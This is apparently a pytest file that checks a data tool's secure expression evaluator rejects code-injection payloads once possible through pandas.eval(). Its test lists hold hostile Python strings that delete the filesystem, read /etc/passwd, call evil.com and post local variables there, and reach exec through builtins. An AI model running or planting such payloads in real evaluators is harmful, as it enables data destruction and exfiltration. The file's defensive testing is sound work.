"""Security integration tests for column server with secure expression evaluator.

Tests that column server operations are now secure against code injection
attacks while maintaining backward compatibility with legitimate expressions.

Author: DataBeak Security Team
Issue: #46 - Verify pandas.eval() vulnerability is fixed
"""

import pytest

from src.databeak.exceptions import InvalidParameterError
from src.databeak.models.expression_models import SecureExpression
from src.databeak.utils.secure_evaluator import validate_expression_safety


class TestColumnServerSecurity:
    """Test that column server operations are secure against code injection."""

    def test_expression_validation_blocks_code_injection(self):
        """Test that expression validation blocks code injection attacks."""
        malicious_formulas = [
            "__import__('os').system('rm -rf /')",
            "exec('print(\"hacked\")')",
            "open('/etc/passwd').read()",
            "eval('malicious_code')",
            "__builtins__.__dict__['exec']('code')",
        ]

        for malicious_formula in malicious_formulas:
            # Test that validation catches these at the Pydantic level
            with pytest.raises(ValueError) as exc_info:
                SecureExpression(expression=malicious_formula)

            error_msg = str(exc_info.value).lower()
            assert "unsafe" in error_msg, f"Security error not indicated for: {malicious_formula}"

            # Test that direct validation also catches these
            with pytest.raises(InvalidParameterError):
                validate_expression_safety(malicious_formula)

    def test_secure_expression_model_validation(self):
        """Test that SecureExpression model properly validates expressions."""
        # Test valid expressions work
        safe_expr = SecureExpression(expression="col1 + col2")
        assert str(safe_expr) == "col1 + col2"

        # Test that malicious expressions are blocked
        with pytest.raises(ValueError) as exc_info:
            SecureExpression(expression="exec('malicious')")

        assert "unsafe" in str(exc_info.value).lower()

    def test_safe_mathematical_expressions_allowed(self):
        """Test that legitimate mathematical expressions are validated as safe."""
        safe_formulas = [
            "col1 + col2",
            "col1 * 2",
            "abs(negative_col)",
            "sqrt(col1)",
            "max(col1, col2)",
            "np.sin(col1)",
            "np.abs(negative_col)",
            "(col1 + col2) / 2",
        ]

        for formula in safe_formulas:
            # Should not raise any exceptions
            try:
                SecureExpression(expression=formula)
                validate_expression_safety(formula)
            except Exception as e:
                pytest.fail(f"Safe formula should not fail validation: {formula} - Error: {e}")

    def test_vulnerability_fixed_confirmation(self):
        """Test that specific vulnerability patterns are blocked.

        This test confirms that the exact attack patterns that would have worked with pandas.eval()
        are now completely blocked.
        """
        # These are real attack patterns that would have worked with pandas.eval
        real_attack_vectors = [
            "__import__('subprocess').run(['curl', 'evil.com'])",
            "exec('import os; os.system(\"malicious\")')",
            "__import__('requests').post('http://evil.com', json=locals())",
            "__builtins__.__dict__['eval']('malicious_code')",
            "getattr(__builtins__, 'exec')('bad_code')",
        ]

        for attack in real_attack_vectors:
            # Must be blocked at validation level
            with pytest.raises((ValueError, InvalidParameterError)):
                validate_expression_safety(attack)

            # Must be blocked at Pydantic model level
            with pytest.raises(ValueError):
                SecureExpression(expression=attack)


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
